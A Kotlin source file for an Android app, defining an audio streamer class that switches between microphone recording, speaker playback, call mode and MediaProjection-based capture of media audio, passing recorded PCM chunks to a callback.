package com.systemlinker.features

import android.annotation.SuppressLint
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioPlaybackCaptureConfiguration
import android.media.AudioRecord
import android.media.AudioTrack
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

enum class AudioMode { OFF, CALL, PLAY_ONLY, MIC_ONLY, MEDIA_ONLY }

class AudioStreamer(private val onAudioDataReady: (ByteArray) -> Unit) {

    private val sampleRate = 16000
    private val channelConfigIn = AudioFormat.CHANNEL_IN_MONO
    private val channelConfigOut = AudioFormat.CHANNEL_OUT_MONO
    private val audioFormat = AudioFormat.ENCODING_PCM_16BIT

    private var audioRecord: AudioRecord? = null
    private var audioTrack: AudioTrack? = null

    private var recordJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    
    var currentMode: AudioMode = AudioMode.OFF
        private set

    fun switchMode(newMode: AudioMode, mediaProjection: MediaProjection? = null) {
        if (currentMode == newMode) return
        
        // Always stop existing streams cleanly before switching
        stopAll()
        currentMode = newMode

        when (newMode) {
            AudioMode.CALL -> {
                startSpeaker()
                startMicRecord()
            }
            AudioMode.PLAY_ONLY -> {
                startSpeaker()
            }
            AudioMode.MIC_ONLY -> {
                startMicRecord()
            }
            AudioMode.MEDIA_ONLY -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && mediaProjection != null) {
                    startMediaCapture(mediaProjection)
                } else {
                    // Fallback to OFF if projection is missing or Android version is too low
                    currentMode = AudioMode.OFF 
                }
            }
            AudioMode.OFF -> {
                // Handled by stopAll()
            }
        }
    }

    private fun startSpeaker() {
        val minBufSizeOut = AudioTrack.getMinBufferSize(sampleRate, channelConfigOut, audioFormat)
        
        audioTrack = AudioTrack.Builder()
            .setAudioAttributes(
                AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA) // Use MEDIA so it routes like normal music/earphones
                    .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                    .build()
            )
            .setAudioFormat(
                AudioFormat.Builder()
                    .setSampleRate(sampleRate)
                    .setEncoding(audioFormat)
                    .setChannelMask(channelConfigOut)
                    .build()
            )
            .setBufferSizeInBytes(minBufSizeOut)
            .setTransferMode(AudioTrack.MODE_STREAM)
            .build()

        audioTrack?.play()
    }

    @SuppressLint("MissingPermission")
    private fun startMicRecord() {
        val minBufSizeIn = AudioRecord.getMinBufferSize(sampleRate, channelConfigIn, audioFormat)
        
        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION, // Optimized for call-like mic routing
            sampleRate, channelConfigIn, audioFormat, minBufSizeIn
        )
        
        audioRecord?.startRecording()
        startTransmissionLoop(minBufSizeIn)
    }

    @SuppressLint("MissingPermission")
    private fun startMediaCapture(mediaProjection: MediaProjection) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
        
        val minBufSizeIn = AudioRecord.getMinBufferSize(sampleRate, channelConfigIn, audioFormat)
        val config = AudioPlaybackCaptureConfiguration.Builder(mediaProjection)
            .addMatchingUsage(AudioAttributes.USAGE_MEDIA)
            .addMatchingUsage(AudioAttributes.USAGE_GAME)
            .addMatchingUsage(AudioAttributes.USAGE_UNKNOWN)
            .build()

        audioRecord = AudioRecord.Builder()
            .setAudioFormat(
                AudioFormat.Builder()
                    .setEncoding(audioFormat)
                    .setSampleRate(sampleRate)
                    .setChannelMask(channelConfigIn)
                    .build()
            )
            .setBufferSizeInBytes(minBufSizeIn)
            .setAudioPlaybackCaptureConfig(config)
            .build()

        audioRecord?.startRecording()
        startTransmissionLoop(minBufSizeIn)
    }

    private fun startTransmissionLoop(bufferSize: Int) {
        recordJob = scope.launch {
            val buffer = ByteArray(bufferSize)
            while (isActive) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0) {
                    val dataToSend = ByteArray(read + 1)
                    dataToSend[0] = 0x01 // Header indicating Audio Data
                    System.arraycopy(buffer, 0, dataToSend, 1, read)
                    onAudioDataReady(dataToSend)
                }
            }
        }
    }

    fun playIncomingAudio(pcmBytes: ByteArray) {
        // Only play audio if we are in a mode that permits outputting sound
        if (currentMode == AudioMode.CALL || currentMode == AudioMode.PLAY_ONLY) {
            if (audioTrack?.playState == AudioTrack.PLAYSTATE_PLAYING) {
                audioTrack?.write(pcmBytes, 0, pcmBytes.size)
            }
        }
    }

    fun stopAll() {
        currentMode = AudioMode.OFF
        recordJob?.cancel()
        
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {}
        
        try {
            audioTrack?.stop()
            audioTrack?.flush()
            audioTrack?.release()
        } catch (e: Exception) {}
        
        audioRecord = null
        audioTrack = null
    }
}